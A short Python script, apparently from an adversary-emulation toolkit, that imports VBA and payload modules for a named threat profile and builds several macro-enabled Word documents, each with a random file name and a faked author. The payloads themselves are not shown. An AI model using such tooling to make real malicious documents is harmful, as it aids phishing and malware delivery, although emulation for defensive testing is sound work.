from internals import office_doc_builder
from internals import random_stuff
from internals import utils
import importlib
import os

adversary = 'underscore_crew_201806'

generate_vba = importlib.import_module("adversary." + adversary + ".generate_vba")
payloads = importlib.import_module("adversary." + adversary + ".payloads")

#  set these

out_root_path = os.path.join('C:', '\\', 'Users', 'h', 'Desktop', 'out')

playbook = generate_vba.generate(payloads.payload_list[0])

c = 0

while c < 4:
    out_file_name = random_stuff.gen_doc_name("docm")
    out_file_path = os.path.join(out_root_path, out_file_name)
    initials, name = random_stuff.getrandomauthor()
    utils.set_doc_author_keys(userinitials=initials, username=name)
    playbook.append({'set_author': name})
    print("[*] Building document " + out_file_name + " with author: " + name)
    office_doc_builder.build_doc(template='C:\\Users\\h\\PycharmProjects\\adb\\adversary\\underscore_crew_201806\\template.docx',
                                 outfile=out_file_path,
                                 actions=playbook)
    c = c + 1
